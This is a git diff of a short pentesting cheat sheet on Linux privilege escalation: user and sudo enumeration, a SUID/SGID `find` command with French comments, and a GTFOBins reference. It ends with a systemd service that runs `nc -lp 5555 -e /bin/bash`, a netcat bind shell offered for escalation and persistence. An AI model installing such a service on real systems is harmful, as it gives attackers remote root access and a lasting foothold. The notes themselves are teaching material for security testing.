@@ -10,17 +10,9 @@ title: "Privilege Escalation"
 
 ## On linux
 
-Look at the current user and it's rights
+Look at the current user and it's rights : `id`
 
-```
-id
-```
-
-Look for the sudo rights, maybe a command can be abused.
-
-```
-sudo -l
-```
+Look for the sudo rights, maybe a command can be abused : `sudo -l`
 
 ### SUID
 
@@ -34,7 +26,7 @@ find / -perm -4000 -o -perm -2000 -exec ls -ldb {} \; 2>/dev/null | tee suid_sgi
 
 Command details
 
-```bash
+```txt
 find \                # lister tout les fichiers
   / \                 # depuis la racine
   -perm -4000 \       # qui ont le bit SUID d'activer
@@ -49,7 +41,7 @@ Once you have this binary list, you can search for a way to escalate privileges 
 
 If netcat is available and the `systemctl` command can be abused (see [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/)), the following service can be installed to elevate privileges and, even, as a way to create persistance.
 
-```txt
+```systemd
 [Service]
 Type=oneshot
 ExecStart=/bin/sh -c "nc -lp 5555 -e /bin/bash"
